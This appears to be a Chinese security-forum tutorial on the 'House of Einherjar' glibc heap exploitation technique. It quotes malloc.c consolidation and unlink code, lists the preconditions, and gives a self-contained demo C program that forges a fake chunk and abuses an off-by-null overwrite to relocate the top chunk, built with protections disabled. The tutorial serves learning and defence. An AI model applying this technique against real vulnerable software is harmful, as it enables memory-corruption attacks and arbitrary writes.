> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-287392.htm)

> [分享]House of Einherjar

相关源码
----

​ 文件路径 (malloc/malloc.c)

### consolidate backward

```
if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

​ 这段代码是向后合并的操作，p 是刚刚被释放的堆块。如果它的 prev_inuse 位是 0 的话 (正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p->prev_size) 赋给 prevsize，把 p 的大小修改为两个堆块的大小之和。通过 p 的地址减去上一个堆块的大小，找到合并后，p 应该在的地址，并更新 p。再用新的 p 去执行 unlink。

### unlink

```
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                    \
    BK = P->bk;                                    \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))           \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                    \
        FD->bk = BK;                               \
        BK->fd = FD;                               \
        if (!in_smallbin_range (P->size)                   \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {             \
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)          \
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
          malloc_printerr (check_action,                      \
                   "corrupted double-linked list (not small)",    \
                   P, AV);                        \
            if (FD->fd_nextsize == NULL) {                     \
                if (P->fd_nextsize == P)                   \
                  FD->fd_nextsize = FD->bk_nextsize = FD;           \
                else {                                \
                    FD->fd_nextsize = P->fd_nextsize;               \
                    FD->bk_nextsize = P->bk_nextsize;               \
                    P->fd_nextsize->bk_nextsize = FD;               \
                    P->bk_nextsize->fd_nextsize = FD;               \
                  }                               \
              } else {                                \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;            \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;            \
              }                                   \
          }                                   \
      }                                       \
}
```

​ unlink 操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。这里第 9 行是针对 lagebin 的一个检测，而在我们这个利用手法中，基本都是 lagebin，所以我们需要对这个 fd_nextsize 和 bk_nextsize, 做一个绕过的检测。因为当 lagebin 中只有一个堆块时，fd_nextsize 和 bk_nextsize, 都指向 p 自己，所以我们把这两个设置为 p 的地址即可。

### consolidate into top

```
else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }
```

​ 这段就是就是把与 topchunk 相邻的空闲堆块与 top chunk 合并。并更新 top chunk 的大小和地址。

原理和条件
-----

### 原理

​ 这里是这样，利用某些手段伪造出一个 fakechunk，这个 chunk 位于我们想要分配的目的地址上 (记为 target)。 同时，我们利用可以正常分配到的一个 chunk (记为 p)。通过修改 p 的 prevsize 和 pre_inuse, 让 p 和 target 合并为一个堆块，当然 p 本身是与 topchunk 相邻的。此时，target 和 p 都被 topchunk 合并为新的 topchunk。此时 topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。

### 条件

​ 1. 伪造 fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址  
​ 2.off-by-one 或 off-by-null，要能修改 pre_inuse。

demo
----

```
#include #include #include #include #include int main()
{
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
 
    uint8_t* a;
    uint8_t* b;
    uint8_t* c;
 
    a=(uint8_t*)malloc(0x38);/*假设，我们要利用a去溢出到下一个堆块。*/
    size_t* a_addr=(size_t *)(a-sizeof(size_t)*2);
    size_t  a_size=malloc_usable_size(a);
    printf("\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\033[0m\n");
    printf("a的地址(包含chunk头)：%p\n",a_addr);
    printf("a的大小(不含chunk头)：%lx\n\n",a_size);
         
    size_t fakechunk[6];/*这里，我们通过某种方法伪造了fakechunk。*/
    fakechunk[0]=0x100,fakechunk[1]=0x100;
    fakechunk[2]=(size_t)fakechunk;
    fakechunk[3]=(size_t)fakechunk;
    fakechunk[4]=(size_t)fakechunk;
    fakechunk[5]=(size_t)fakechunk;
    printf("\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\033[0m\n");
    printf("fakechunk的地址(包含chunk头)：%p\n",fakechunk);
    printf("fd: %#lx\n",fakechunk[2]);
    printf("bk: %#lx\n",fakechunk[3]);
    printf("fd_nextsize: %#lx\n",fakechunk[4]);
    printf("bk_nextsize: %#lx\n\n",fakechunk[5]);
     
    b=(uint8_t*)malloc(0xf8);/*这就是要触发，向后合并和topchunk合并的堆块.*/
    size_t* b_size_ptr=(size_t*)(b-sizeof(size_t));/*指向 chunk b 的size位.*/
    size_t* b_addr=(size_t *)(b-sizeof(size_t)*2);/*同时也是 chunk b 的prev_size*/
    printf("\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\033[0m\n");
    printf("b的地址(含chunk头)： %p\n",b_addr);
    printf("b的size位：%#lx\n\b",*b_size_ptr);
    printf("b的prev_size: %#lx\n\n",*b_addr);
    /*
    接下来就是修改size和prev_size
    这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是
    这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。
    */
    printf("\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\033[0m\n");
    a[a_size]=0;
    printf("修改后b的size位：%#lx\n",*b_size_ptr);
     
    /*
    接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,
    它应该是从fakechunk到b中间这么大的一块区域
    */
    size_t fakesize=(size_t)((uint8_t *)(b_addr)-(uint8_t *)fakechunk);
    printf("b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\n",b_addr,fakechunk,fakesize);
    *(size_t *)&a[a_size-sizeof(size_t)]=fakesize;
    printf("修改后b的prev_size: %#lx\n\n",*b_addr);
    /*为了正确的合并，fakechunk的size需要和prev_size对应上*/
    fakechunk[1]=fakesize;
    /*触发合并*/
    free(b);
    printf("合并后fakechunk的size: %#lx\n",fakechunk[1]);
    printf("是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\n");
    /*最后看分配到了哪里*/
    c=(uint8_t*)malloc(0x200);
    size_t* c_addr=(size_t *)(c-sizeof(size_t)*2);
    printf("\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\033[0m\n");
    printf("c的地址(包含chunk头)：%p\n",c_addr);
} 
```

### 说明

​ 请在 ubuntu16 下编译 (即使用 glibc-2.23)。编译时记得关掉 pie，这样便于打断点。  
​ 编译时参数 (只能在 64 位下编译)

```
gcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro
```

​ 这个 demo 是自己写的，在 how2heap 的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的 size 大小，这里描述也做了修改。因为合并是 b 和 fakechunk 以及 topchunk，所以最后的大小理论上也是三个堆块的大小相加。  
![](https://bbs.kanxue.com/upload/attach/202506/989669_T7MM97AMG23GBQ3.png)  
​ 事实上，也确实如此

### 逐步演示

#### 创建 a 堆块

![](https://bbs.kanxue.com/upload/attach/202506/989669_4EZVN65RAWTZBD2.png)  
![](https://bbs.kanxue.com/upload/attach/202506/989669_HEUD592QSQ9F6A9.png)

#### 伪造 fakechunk

![](https://bbs.kanxue.com/upload/attach/202506/989669_NG97XBR45BWX8JT.png)

#### 创建 b 堆块

![](https://bbs.kanxue.com/upload/attach/202506/989669_GPJ7T9KZMMH5TPR.png)

#### 篡改 b 的 size 的 pre_inuse 位

![](https://bbs.kanxue.com/upload/attach/202506/989669_XQ5WVMNB8N88KAA.png)

#### 篡改 b 的 prev_size

![](https://bbs.kanxue.com/upload/attach/202506/989669_X7BHV2CEANFG7WQ.png)

#### 修改 fakechunk 的 size

![](https://bbs.kanxue.com/upload/attach/202506/989669_KC63P2QN34XHN9W.png)

#### free(b)

![](https://bbs.kanxue.com/upload/attach/202506/989669_NQYZRMEN8STDTXW.png)  
这里因为 pwndbg 的原因，所以使用 heap 命令查看到的信息会和实际有出入

[[培训] 内核驱动高级班，冲击 BAT 一流互联网大厂工作，每周日 13:00-18:00 直播授课](https://www.kanxue.com/book-section_list-173.htm)